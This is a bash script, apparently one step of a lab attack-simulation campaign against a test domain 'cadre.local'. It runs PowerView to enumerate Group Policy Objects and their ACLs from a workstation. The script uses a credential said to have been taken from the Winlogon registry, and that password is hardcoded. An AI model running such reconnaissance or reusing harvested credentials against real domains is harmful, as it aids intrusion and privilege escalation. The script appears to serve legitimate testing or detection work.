#!/usr/bin/env bash
# T023 — GPO abuse from ws01 as analyst_cloud (cadre.local)
# Enumerates GPOs and links a GPO to an OU (read-only demonstration).
# Entry credential: analyst_cloud (Phase 3.5A Winlogon registry extraction from mbr01)
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LIB="${SCRIPT_DIR}/../lib"
source "${LIB}/campaign-a-common.sh"

CASE_ID="CADRE-T023-GPO-ABUSE-${CASE_DATE:-$(date -u +%Y%m%d)}"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)

echo "=== T023 GPO abuse | ${CASE_ID} | T0=${T0} ==="

DC01="${DC01:-dc01.cadre.local}"
DOMAIN_ROOT="${DOMAIN_ROOT:-cadre.local}"

CMD='
$pv = "C:\Tools\cadre-attack\PowerView.ps1";
if (-not (Test-Path $pv)) { throw "PowerView.ps1 not found" }
. $pv;
$ErrorActionPreference = "Stop";
Write-Output "=== GPOs ===";
Get-DomainGPO -DomainController "'''"${DC01}"'''" -Domain "'''"${DOMAIN_ROOT}"'''" | Select-Object displayName, gpcFileSysPath | Format-Table -AutoSize;
Write-Output "=== GPO Links ===";
Get-DomainGPO -DomainController "'''"${DC01}"'''" -Domain "'''"${DOMAIN_ROOT}"'''" | Get-DomainObjectAcl -ResolveGUIDs | Select-Object ObjectDN, ActiveDirectoryRights, SecurityIdentifier | Format-Table -AutoSize;
Write-Output "T023_OK: GPO enumeration complete"
'

ws01_exec_as analyst_cloud 'Cl0ud_An@lyst!' "$CMD" 'cadre.local'

cadre_export "${CASE_ID}" T023 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T023 run complete ==="
